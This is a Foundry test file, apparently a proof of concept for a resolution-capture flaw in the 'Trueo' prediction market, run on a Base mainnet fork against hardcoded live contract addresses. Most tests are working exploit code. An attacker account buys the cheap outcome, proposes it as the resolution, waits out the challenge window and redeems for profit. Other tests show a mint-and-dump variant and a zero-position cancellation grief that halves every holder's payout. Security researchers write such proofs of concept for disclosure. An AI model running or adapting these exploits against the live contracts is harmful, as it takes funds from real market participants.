// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {
    IERC20, IVault, ITruthMarket, ITruthMarketManager, IOracleCouncil, IOracleBonds,
    PoolKey, IPoolManager
} from "../src/Interfaces.sol";
import {V4Swapper} from "../src/V4Swapper.sol";

/// @title Trueo resolution-capture PoC (Base fork)
/// @notice Reads live Trueo state, exercises the permissionless proposal path from an
///         unprivileged EOA, and measures net P&L in TYD (the market payment token).
contract TrueoCaptureTest is Test {
    address constant MGR = 0x61A98Bef11867c69489B91f340fE545eEfc695d7;
    address constant BONDS = 0x8175b0A1e803aC4205aE35F614315Ba801275baA;
    address constant COUNCIL = 0xCa7Af04BC6D24EEA67618c11B883be6851F198BE;
    address constant TYD = 0xb13CF163d916917d9cD6E836905cA5f12a1dEF4B;
    address constant USDC = 0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913;

    // biggest unresolved market: "Polymarket Token in 2026?" (endOfTrading 2025-12-17,
    // collateral 89,154.41 TYD = $93,237 at pps 1.0458)
    address constant MARKET = 0xA96Ac028DA2431F87fa02fB72aef948F2ef4E737;
    address constant YES = 0x4EabdF5B6715ecBa031e886391f740F30044ea87;
    address constant NO = 0x1D66746e3111647b67e485b46c5E48f948cdb964;

    PoolKey key = PoolKey({
        currency0: YES,
        currency1: TYD,
        fee: 8000,
        tickSpacing: 60,
        hooks: 0x1cFeAD8E66cebC5E51093Dfd247Ad34f841740c4
    });

    V4Swapper swapper;

    function setUp() public {
        string memory rpc = vm.envOr("BASE_RPC_URL", string(""));
        if (bytes(rpc).length == 0) rpc = "https://base-rpc.publicnode.com";
        vm.createSelectFork(rpc);
        swapper = new V4Swapper();
        console2.log("fork block", block.number);
        console2.log("market collateral TYD", IERC20(TYD).balanceOf(MARKET));
        console2.log("YES supply", IERC20(YES).totalSupply());
        console2.log("resolver bond", ITruthMarket(MARKET).resolverBondAmount());
        console2.log("fcp", ITruthMarket(MARKET).firstChallengePeriod());
        console2.log("status", ITruthMarket(MARKET).getCurrentStatus());
    }

    function _fund(address who, uint256 usdcIn) internal returns (uint256) {
        deal(USDC, who, usdcIn);
        vm.startPrank(who);
        IERC20(USDC).approve(TYD, type(uint256).max);
        uint256 shares = IVault(TYD).deposit(usdcIn, who);
        vm.stopPrank();
        console2.log("fund usdc", usdcIn);
        console2.log("fund shares", shares);
        console2.log("tyd bal", IERC20(TYD).balanceOf(who));
        return shares;
    }

    function _buyYes(address who, uint256 tydIn) internal returns (uint256 yesOut) {
        vm.startPrank(who);
        IERC20(TYD).approve(address(swapper), tydIn);
        swapper.swapExactIn(key, false, tydIn, who);
        vm.stopPrank();
        yesOut = IERC20(YES).balanceOf(who);
    }

    // ---------------------------------------------------------------- capture
    /// unprivileged EOA buys the cheap side on the live v4 pool, proposes it,
    /// waits out the 12h window, redeems at par. No dispute occurs.
    function test_capture_profit_8k() public {
        _capture(8_000e6, "8k");
    }

    function test_capture_profit_9k() public {
        _capture(9_000e6, "9k");
    }

    /// variant: mint fresh pairs and dump the NO leg into the NO pool, then buy
    /// as much YES as the tick boundary allows, propose YES and redeem.
    function test_capture_mint_dump() public {
        PoolKey memory noKey = PoolKey({
            currency0: NO,
            currency1: TYD,
            fee: 8000,
            tickSpacing: 60,
            hooks: 0x1cFeAD8E66cebC5E51093Dfd247Ad34f841740c4
        });
        address attacker = makeAddr("attacker2");
        _fund(attacker, 120_000e6);
        uint256 t0 = IERC20(TYD).balanceOf(attacker);
        uint256 pps = IVault(TYD).pricePerShare();

        vm.startPrank(attacker);
        IERC20(TYD).approve(MARKET, type(uint256).max);
        ITruthMarket(MARKET).mint(20_000e6);          // 20k YES + 20k NO
        IERC20(NO).approve(address(swapper), type(uint256).max);
        swapper.swapExactIn(noKey, true, 20_000e18, attacker); // dump NO
        IERC20(TYD).approve(address(swapper), type(uint256).max);
        swapper.swapExactIn(key, false, 9_000e6, attacker);    // buy YES
        vm.stopPrank();

        uint256 yesOut = IERC20(YES).balanceOf(attacker);
        uint256 bond = ITruthMarket(MARKET).resolverBondAmount();
        vm.startPrank(attacker);
        IERC20(TYD).approve(BONDS, bond);
        ITruthMarketManager(MGR).proposeResolution(MARKET, 1);
        vm.stopPrank();

        vm.warp(block.timestamp + ITruthMarket(MARKET).firstChallengePeriod() + 1);
        vm.roll(block.number + 100);

        vm.startPrank(attacker);
        IERC20(YES).approve(MARKET, type(uint256).max);
        ITruthMarket(MARKET).redeem(IERC20(YES).balanceOf(attacker));
        vm.stopPrank();

        uint256 t2 = IERC20(TYD).balanceOf(attacker);
        console2.log("mintdump YES out", yesOut);
        console2.log("mintdump NET TYD");
        console2.logInt(int256(t2) - int256(t0));
        console2.log("mintdump NET USD");
        console2.logInt((int256(t2) - int256(t0)) * int256(pps) / 1e6);
    }

    /// scan how much YES one swap can buy before the pool's tick-boundary
    /// validator (TruthMarketSwapValidator) rejects the swap.
    function test_swap_size_scan() public {
        address a = makeAddr("scanner");
        _fund(a, 120_000e6);
        uint256[7] memory sizes = [uint256(8_000e6), 9_000e6, 10_000e6, 12_000e6, 14_000e6, 16_000e6, 20_000e6];
        for (uint256 i = 0; i < sizes.length; i++) {
            uint256 snap = vm.snapshotState();
            vm.startPrank(a);
            IERC20(TYD).approve(address(swapper), sizes[i]);
            try swapper.swapExactIn(key, false, sizes[i], a) {
                console2.log("size TYD", sizes[i]);
                console2.log("  yes out", IERC20(YES).balanceOf(a));
            } catch {
                console2.log("size TYD", sizes[i]);
                console2.log("  REVERTED (tick boundary)");
            }
            vm.stopPrank();
            vm.revertToState(snap);
        }
    }

    function _capture(uint256 spend, string memory tag) internal {
        address attacker = makeAddr("attacker");
        _fund(attacker, spend + 5_000e6);
        uint256 t0 = IERC20(TYD).balanceOf(attacker);
        uint256 pps = IVault(TYD).pricePerShare();

        uint256 yesOut = _buyYes(attacker, spend);
        uint256 t1 = IERC20(TYD).balanceOf(attacker);

        uint256 bond = ITruthMarket(MARKET).resolverBondAmount();
        vm.startPrank(attacker);
        IERC20(TYD).approve(BONDS, bond);
        ITruthMarketManager(MGR).proposeResolution(MARKET, 1); // YES
        vm.stopPrank();

        assertEq(uint8(ITruthMarket(MARKET).getCurrentStatus()), 2, "proposal not live");
        assertEq(ITruthMarketManager(MGR).resolverAddress(MARKET), attacker, "resolver not attacker");

        vm.warp(block.timestamp + ITruthMarket(MARKET).firstChallengePeriod() + 1);
        vm.roll(block.number + 100);

        uint256 yesBal = IERC20(YES).balanceOf(attacker);
        vm.startPrank(attacker);
        IERC20(YES).approve(MARKET, type(uint256).max);
        ITruthMarket(MARKET).redeem(yesBal);
        vm.stopPrank();

        uint256 t2 = IERC20(TYD).balanceOf(attacker);
        assertEq(uint8(ITruthMarket(MARKET).getCurrentStatus()), 7, "not finalized");
        assertEq(ITruthMarket(MARKET).winningPosition(), 1, "wrong winner");

        console2.log(tag, "spend TYD", spend);
        console2.log(tag, "YES out", yesOut);
        console2.log(tag, "avg price TYD/YES", (spend * 1e18) / yesOut);
        console2.log(tag, "TYD after buy+propose", t1);
        console2.log(tag, "TYD after redeem", t2);
        console2.log(tag, "NET TYD");
        console2.logInt(int256(t2) - int256(t0));
        console2.log(tag, "NET USD (pps)");
        console2.logInt((int256(t2) - int256(t0)) * int256(pps) / 1e6);
        console2.log(tag, "bond returned?", IERC20(TYD).balanceOf(BONDS));
    }

    // ---------------------------------------------------------------- defense
    /// a second unprivileged EOA disputes inside the window: market freezes in
    /// DisputeRaised and no redemption is possible even 30 days later.
    function test_dispute_freezes_market() public {
        address attacker = makeAddr("attacker");
        address disputor = makeAddr("disputor");
        _fund(attacker, 15_000e6);
        _fund(disputor, 2_000e6);

        _buyYes(attacker, 8_000e6);
        uint256 bond = ITruthMarket(MARKET).resolverBondAmount();
        vm.startPrank(attacker);
        IERC20(TYD).approve(BONDS, bond);
        ITruthMarketManager(MGR).proposeResolution(MARKET, 1);
        vm.stopPrank();
        assertEq(uint8(ITruthMarket(MARKET).getCurrentStatus()), 2);

        vm.startPrank(disputor);
        IERC20(TYD).approve(BONDS, bond);
        IOracleCouncil(COUNCIL).openDispute(MARKET, "wrong outcome");
        vm.stopPrank();

        assertEq(uint8(ITruthMarket(MARKET).getCurrentStatus()), 3, "not DisputeRaised");
        console2.log("disputor bond locked", IERC20(TYD).balanceOf(BONDS));

        vm.warp(block.timestamp + 30 days);
        vm.roll(block.number + 1000);
        assertEq(uint8(ITruthMarket(MARKET).getCurrentStatus()), 3, "should stay frozen");

        uint256 yesBal = IERC20(YES).balanceOf(attacker);
        vm.startPrank(attacker);
        IERC20(YES).approve(MARKET, type(uint256).max);
        vm.expectRevert();
        ITruthMarket(MARKET).redeem(yesBal);
        vm.stopPrank();
        console2.log("redeem reverted: market frozen by 250 TYD dispute");
    }

    // ---------------------------------------------------------------- griefing
    /// zero-position EOA proposes CANCELED; after 12h the market auto-finalizes,
    /// the resolver bond is returned in full (no dispute) and every holder of the
    /// true side is paid 0.5 instead of 1.0.
    function test_zero_position_cancel_grief() public {
        address griefer = makeAddr("griefer");
        _fund(griefer, 2_000e6);
        uint256 t0 = IERC20(TYD).balanceOf(griefer);
        uint256 bond = ITruthMarket(MARKET).resolverBondAmount();

        assertEq(IERC20(YES).balanceOf(griefer), 0, "griefer holds nothing");
        assertEq(IERC20(NO).balanceOf(griefer), 0, "griefer holds nothing");

        vm.startPrank(griefer);
        IERC20(TYD).approve(BONDS, bond);
        ITruthMarketManager(MGR).proposeResolution(MARKET, 3); // CANCELED
        vm.stopPrank();
        assertEq(uint8(ITruthMarket(MARKET).getCurrentStatus()), 2);

        vm.warp(block.timestamp + ITruthMarket(MARKET).firstChallengePeriod() + 1);
        vm.roll(block.number + 100);

        ITruthMarket(MARKET).settleBonds(); // permissionless
        assertEq(uint8(ITruthMarket(MARKET).getCurrentStatus()), 7, "not finalized");
        assertEq(ITruthMarket(MARKET).winningPosition(), 3, "not canceled");

        uint256 t1 = IERC20(TYD).balanceOf(griefer);
        console2.log("griefer TYD before", t0);
        console2.log("griefer TYD after", t1);
        console2.log("net TYD (bond refunded)");
        console2.logInt(int256(t1) - int256(t0));
        // 89,154 YES holders now get 0.5/TYD per token instead of 1.0
        console2.log("value destroyed for YES side TYD", IERC20(YES).totalSupply() / 2);
    }

    // ---------------------------------------------------------------- finality
    /// after the challenge window the outcome can no longer be corrected, even by
    /// the oracle council itself.
    function test_no_correction_after_window() public {
        address attacker = makeAddr("attacker");
        _fund(attacker, 2_000e6);
        uint256 bond = ITruthMarket(MARKET).resolverBondAmount();
        vm.startPrank(attacker);
        IERC20(TYD).approve(BONDS, bond);
        ITruthMarketManager(MGR).proposeResolution(MARKET, 2); // NO
        vm.stopPrank();

        vm.warp(block.timestamp + ITruthMarket(MARKET).firstChallengePeriod() + 1);
        vm.roll(block.number + 100);
        assertEq(uint8(ITruthMarket(MARKET).getCurrentStatus()), 7, "expected effective finality");

        vm.prank(COUNCIL);
        vm.expectRevert();
        ITruthMarketManager(MGR).resolveMarketByCouncil(MARKET, 1);
        console2.log("council correction reverted after window");
    }
}
